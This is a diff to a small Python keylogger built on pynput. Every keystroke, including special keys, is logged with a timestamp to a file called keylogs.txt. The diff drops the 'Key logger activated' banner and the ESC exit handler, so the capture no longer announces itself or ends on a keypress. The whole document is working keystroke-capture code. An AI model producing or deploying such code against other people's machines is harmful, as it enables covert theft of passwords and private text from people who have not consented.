@@ -1,23 +1,23 @@
 from pynput import keyboard
 from datetime import datetime
+import logging
 
-print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Key logger activated\n")
+# Setup logging
+logging.basicConfig(filename="keylogs.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")
 
 def on_press(key):
     timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
 
-    if key == keyboard.Key.esc:
-        print(f"{timestamp} ESC pressed, exiting\n")
-        listener.stop()
-        return False  # Stop listener
+    try:
+        # Normal key
+        log_entry = f"{timestamp} [KEY: {key.char}]"
+    except AttributeError:
+        # Special key
+        log_entry = f"{timestamp} [SPECIAL: {str(key).replace('Key.', '').upper()}]"
 
-    with open("keylogs.txt", "a") as logs:  # Open the file inside the function
-        try:
-            logs.write(f"{timestamp} [{key.char}] pressed\n")
-            print(f"{timestamp} Key logged")
-        except AttributeError:
-            logs.write(f"{timestamp} [{str(key).replace('Key.', '').upper()}] pressed\n")
-            print(f"{timestamp} Special Key logged")
+    logging.info(log_entry)
+    print(log_entry)  # For real-time monitoring
 
+# Start listening
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
